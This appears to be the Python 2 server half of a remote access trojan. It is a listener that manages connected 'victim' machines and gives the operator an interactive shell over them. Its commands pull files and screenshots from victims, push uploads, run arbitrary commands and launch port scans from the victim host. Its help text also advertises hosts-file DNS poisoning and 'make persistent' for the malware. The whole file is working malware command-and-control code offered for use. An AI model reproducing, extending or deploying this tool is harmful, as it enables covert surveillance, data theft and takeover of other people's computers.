#SERVER END

import socket
import os
import random
from Crypto.Cipher import  AES
import  string
import sys, select
import time


HOST_IP = " Enter your IP here"    #Enter your ip here
HOST_PORT = 8080             #the port on which you want to interact


clear = lambda : os.system('clear')    #clear function



#receives the file mentioned

def receive(conn,command,name,ext):

    conn.send(command)
    bits = conn.recv(1024)
    if not 'Unable to find out the file' in bits:
        f = open('/root/Desktop/'+name+'.'+ext ,'wb')
        while True:
            if bits.endswith('DONE'):
                if name != 'screenshot' :
                    print '[+] Transfer completed '
                else :
                    print '[+] Screenshot taken '
                f.close()
                break
            f.write(bits)
            bits = conn.recv(1024)
        f.close()
    else:
        print '[-] Unable to find the file'




#sends files to the client

def send (conn , command):

    command = command[7:]
    path, name = command.rsplit('/', 1)
    conn.send(name)
    if os.path.exists(command):
        f = open(command , 'rb')
        packet = f.read(1024)
        while packet != '':
            conn.send(packet)
            packet = f.read(1024)
        conn.send( 'DONE' )
        print "[+] File uploaded"
        f.close()
    else :
        conn.send( 'Unable to upload the file' )
        print "[-] Unable to upload the file"




#try to connect and interact with the client

def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST_IP,HOST_PORT))
    s.listen(128)

    #listening variables
    active = False
    clients = []
    socks=[]
    interval = 0.8

    print '[+] Listening for incoming TCP connection on port ', HOST_PORT

    while True:

        #listen for clients

        try:
            s.settimeout(5)

            #accepts connection
            try:
                conn, addr = s.accept()
            except socket.timeout:
                continue

            #add the socket
            if addr:

                conn.settimeout(None)
                #add socket
                socks += [conn]
                #add client
                clients += [str(addr)]

            #display client
            clear()
            print '[+] Listening for incoming TCP connection on port ', HOST_PORT
            if len(clients) > 0:
                for j in range(0,len(clients)):
                    print '[' + str((j+1)) + '] Client. ' + clients[j] + '\n'
            time.sleep(interval)
            print "Press Ctrl+C to interact"
        except KeyboardInterrupt:
            clear()
            print '[+] Listening for incoming TCP connection on port ', HOST_PORT
            if len(clients)>0:
                for j in range(0, len(clients)):
                    print '[' + str((j + 1)) + '] Client. ' + clients[j] + '\n'
                print "---\n"
                print "[0] Exit\n"
            activate = input("\nEnter option: ")
            if activate == 0:
                if len(clients) > 0:
                    for i in range (0,len(clients)):
                        socks[i].send( 'terminate' )
                        print "Connection " + clients[i] + " closed\n"
                        socks[i].close() #close the connection
                print '\nExiting...\n'
                sys.exit()
            activate -= 1
            clear()
            print '\nActivating client : ' + clients[activate] + '\n'
            active = True

        #interact with specified client
        while active:
            command = raw_input("Shell> ")

            if 'background' in command:
                active = False
                clear()
                print "Press Ctrl+C to interact"
                break

            #to download a file from client end

            elif 'download' in command:
                try:
                    path,ext = command.split('.')
                except Exception , e:
                    path = command
                    pass
                path,name = path.split(' ')
                receive(socks[activate],command,name,ext)

            #takes sceenshot of the victim's screen

            elif 'screenshot' in command:
                receive(socks[activate], command,'screenshot','jpg')

            #upload a file from server's end to client's system
            elif 'upload' in command:
                conn.send(command)
                send(conn,command)
                #send(socks[activate] , command)

            #handels no input condition

            elif '' == command:
                pass

            #display the help

            elif 'help' in command:
                print '''
                       background        Go back to listener mode
                       cd                Change the directory
                       download          Copy a file from victim                                    (format download filename)
                       screenshot        Takes screenshot of victims screen
                       upload            Uploads the file to victims system                         (format upload file/to/upload)
                       search            Searches the given path for a extension                    (format search path*.extension)
                       scan              Scan from victims system for open ports on other systems   (format scan ip_address:port1,ports2,port3)
                       DNS               Poisons the victims systems host file with given url       (format DNS url*domain)'
                       make persistent   Makes your malware persistent'''

            #send the command to victim's system
            else :
                socks[activate].send( command )
                t = socks[activate].recv(1024)
                #print t
                if t == 'Command Executed':  #for commands such as mkdir which return nothing
                    print 'Command Executed'
                else :
                    print t #print the result

def main():
    connect()

main()
